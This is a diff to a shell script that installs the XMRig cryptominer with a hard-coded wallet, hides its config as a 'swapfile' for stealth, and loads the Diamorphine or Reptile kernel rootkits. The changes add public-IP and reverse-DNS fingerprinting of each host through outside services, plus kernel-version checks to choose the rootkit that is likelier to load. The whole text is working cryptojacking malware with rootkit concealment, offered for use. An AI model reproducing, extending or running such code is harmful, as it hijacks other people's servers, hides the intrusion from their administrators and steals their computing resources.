@@ -618,9 +618,9 @@ echo "[*] Configuring XMRig..."
 WALLET="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
 
 # ==================== IP DETECTION FOR PASS FIELD ====================
-echo "[*] Detecting server IP address for worker identification..."
+echo "[*] Detecting server IP address and hostname for worker identification..."
 
-# Use Python for reliable IP detection
+# Use Python for reliable PUBLIC IP detection with reverse DNS
 if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
     PYTHON_CMD=$(command -v python3 || command -v python)
     
@@ -628,36 +628,108 @@ if command -v python3 >/dev/null 2>&1 || command -v python >/dev/null 2>&1; then
 import socket
 import sys
 
-def get_server_ip():
+def get_public_ip():
+    """Get public internet IP address"""
+    methods = [
+        ('ip.sb', 80),
+        ('api.ipify.org', 80),
+        ('ifconfig.me', 80),
+        ('icanhazip.com', 80)
+    ]
+    
+    for host, port in methods:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            
+            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
+            sock.send(request.encode())
+            
+            response = sock.recv(4096).decode()
+            sock.close()
+            
+            lines = response.strip().split('\n')
+            for line in reversed(lines):
+                line = line.strip()
+                if line and '.' in line and len(line) < 20:
+                    parts = line.split('.')
+                    if len(parts) == 4:
+                        try:
+                            all(0 <= int(p) <= 255 for p in parts)
+                            return line
+                        except:
+                            continue
+        except:
+            continue
+    
+    return None
+
+def get_reverse_dns(ip):
+    """Get reverse DNS hostname for IP address"""
     try:
-        # Create UDP socket and connect to external server
-        # This doesn't actually send data, just determines which interface would be used
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
+        # Try reverse DNS lookup
+        hostname, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)
+        return hostname
     except:
+        # Fallback: try to get local hostname
         try:
             return socket.gethostname()
         except:
-            return "na"
+            return None
 
-print(get_server_ip())
+# Get public IP
+public_ip = get_public_ip()
+if not public_ip:
+    public_ip = "na"
+
+# Get reverse DNS
+reverse_dns = get_reverse_dns(public_ip) if public_ip != "na" else None
+
+# Format: [reverse-dns] / IP-Address
+if reverse_dns and reverse_dns != public_ip:
+    # We have both hostname and IP
+    print(f"{reverse_dns} / {public_ip}")
+else:
+    # Only have IP or IP equals hostname
+    print(public_ip)
 PYEOF
 )
 else
-    # Fallback if Python not available (use hostname)
-    PASS=$(hostname 2>/dev/null || echo "na")
+    # Fallback: Use curl for IP and dig/host for reverse DNS
+    PUBLIC_IP=$(curl -4 -s --connect-timeout 5 ip.sb 2>/dev/null || \
+                curl -4 -s --connect-timeout 5 api.ipify.org 2>/dev/null || \
+                echo "na")
+    
+    if [ "$PUBLIC_IP" != "na" ]; then
+        # Try to get reverse DNS
+        if command -v dig >/dev/null 2>&1; then
+            REVERSE_DNS=$(dig +short -x "$PUBLIC_IP" 2>/dev/null | head -1 | sed 's/\.$//')
+        elif command -v host >/dev/null 2>&1; then
+            REVERSE_DNS=$(host "$PUBLIC_IP" 2>/dev/null | grep "domain name pointer" | awk '{print $NF}' | sed 's/\.$//')
+        else
+            REVERSE_DNS=""
+        fi
+        
+        if [ -n "$REVERSE_DNS" ]; then
+            PASS="$REVERSE_DNS / $PUBLIC_IP"
+        else
+            PASS="$PUBLIC_IP"
+        fi
+    else
+        PASS=$(hostname 2>/dev/null || echo "na")
+    fi
 fi
 
-echo "[*] Detected server identifier: $PASS"
+echo "[*] Detected PUBLIC IP address: $PUBLIC_IP"
+echo "[*] Detected reverse DNS: ${REVERSE_DNS:-none}"
+echo "[*] Worker identifier: $PASS"
 
 # Optional: Add email if configured
 EMAIL=""  # Leave empty or set your email
 if [ -n "$EMAIL" ]; then
-    PASS="$PASS:$EMAIL"
-    echo "[*] Added email to password field: $EMAIL"
+    PASS="$PASS / $EMAIL"
+    echo "[*] Added email to identifier: $EMAIL"
 fi
 
 # Create configuration file (will be renamed to swapfile for stealth)
@@ -915,6 +987,34 @@ install_diamorphine() {
         return 1
     fi
     
+    # Check kernel version compatibility
+    KERNEL_VERSION=$(uname -r | cut -d. -f1)
+    KERNEL_MINOR=$(uname -r | cut -d. -f2)
+    
+    echo "[*] Detected kernel version: $(uname -r)"
+    
+    if [ "$KERNEL_VERSION" -ge 6 ]; then
+        echo ""
+        echo "[!] ============================================"
+        echo "[!] WARNING: Kernel 6.x detected!"
+        echo "[!] ============================================"
+        echo "[!] Diamorphine may NOT work on kernel 6.x"
+        echo "[!] Diamorphine is tested up to kernel 5.x"
+        echo ""
+        echo "[*] RECOMMENDATION for kernel 6.x:"
+        echo "    • Use Reptile rootkit instead (better 6.x support)"
+        echo "    • Or skip rootkit installation"
+        echo ""
+        echo "[*] Attempting installation anyway..."
+        echo "    (may fail during load or cause kernel panic)"
+        echo ""
+        sleep 3
+    elif [ "$KERNEL_VERSION" -eq 5 ] && [ "$KERNEL_MINOR" -ge 15 ]; then
+        echo "[*] Kernel 5.15+ detected - should work but watch for issues"
+    else
+        echo "[✓] Kernel version compatible with Diamorphine"
+    fi
+    
     cd /tmp || return 1
     
     # Remove old installation
@@ -946,6 +1046,7 @@ install_diamorphine() {
     echo "[*] Building Diamorphine..."
     if ! make 2>/dev/null; then
         echo "[!] Failed to build Diamorphine"
+        echo "[!] This is common on kernel 6.x - try Reptile instead"
         cd /tmp
         rm -rf diamorphine
         return 1
@@ -955,6 +1056,7 @@ install_diamorphine() {
     echo "[*] Loading Diamorphine kernel module..."
     if ! insmod diamorphine.ko 2>/dev/null; then
         echo "[!] Failed to load Diamorphine"
+        echo "[!] Likely kernel 6.x incompatibility - try Reptile instead"
         cd /tmp
         rm -rf diamorphine
         return 1
@@ -963,6 +1065,7 @@ install_diamorphine() {
     # Verify it loaded
     if lsmod | grep -q diamorphine 2>/dev/null; then
         echo "[✓] Diamorphine loaded successfully"
+        echo "[✓] Surprisingly worked on kernel $(uname -r)!"
         
         # Clean up build artifacts
         cd /tmp
@@ -988,6 +1091,17 @@ install_reptile() {
     if [ "$IS_64BIT" = "false" ]; then
         echo "[!] Skipping Reptile on non-64-bit system"
         return 1
+    fi
+    
+    # Check kernel version
+    KERNEL_VERSION=$(uname -r | cut -d. -f1)
+    echo "[*] Detected kernel version: $(uname -r)"
+    
+    if [ "$KERNEL_VERSION" -ge 6 ]; then
+        echo "[✓] Kernel 6.x detected - Reptile has BETTER compatibility than Diamorphine"
+        echo "[*] Reptile is more actively maintained and supports newer kernels"
+    else
+        echo "[✓] Kernel version compatible with Reptile"
     fi
     
     # Create hidden directory
